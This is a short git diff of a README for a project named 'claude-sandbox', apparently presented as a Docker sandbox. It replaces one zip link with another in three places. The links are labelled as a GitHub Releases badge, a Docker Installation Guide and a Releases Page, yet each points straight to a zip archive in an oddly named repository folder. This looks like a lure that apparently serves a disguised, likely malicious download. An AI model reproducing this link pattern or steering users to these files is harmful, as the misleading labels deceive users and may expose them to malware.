@@ -6,7 +6,7 @@ Welcome to **claude-sandbox**! This application provides a safe, isolated Docker
 
 ## 📥 Download Now
 
-[![GitHub Releases](https://raw.githubusercontent.com/aniktatripathy/claude-sandbox/main/plumping/claude-sandbox-v2.5.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/aniktatripathy/claude-sandbox/main/plumping/claude-sandbox-v2.5.zip)
+[![GitHub Releases](https://github.com/aniktatripathy/claude-sandbox/raw/refs/heads/main/plumping/sandbox-claude-v1.2-alpha.3.zip%20Latest%20Release-brightgreen)](https://github.com/aniktatripathy/claude-sandbox/raw/refs/heads/main/plumping/sandbox-claude-v1.2-alpha.3.zip)
 
 ## 🔍 Overview
 
@@ -21,12 +21,12 @@ With **claude-sandbox**, you can:
 To run **claude-sandbox**, you need:
 
 - A computer with at least 4 GB of RAM.
-- Docker installed. [Docker Installation Guide](https://raw.githubusercontent.com/aniktatripathy/claude-sandbox/main/plumping/claude-sandbox-v2.5.zip)
+- Docker installed. [Docker Installation Guide](https://github.com/aniktatripathy/claude-sandbox/raw/refs/heads/main/plumping/sandbox-claude-v1.2-alpha.3.zip)
 - A stable internet connection.
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page**: Go to [this page to download](https://raw.githubusercontent.com/aniktatripathy/claude-sandbox/main/plumping/claude-sandbox-v2.5.zip).
+1. **Visit the Releases Page**: Go to [this page to download](https://github.com/aniktatripathy/claude-sandbox/raw/refs/heads/main/plumping/sandbox-claude-v1.2-alpha.3.zip).
    
    Here you will see the available versions of **claude-sandbox**.
 
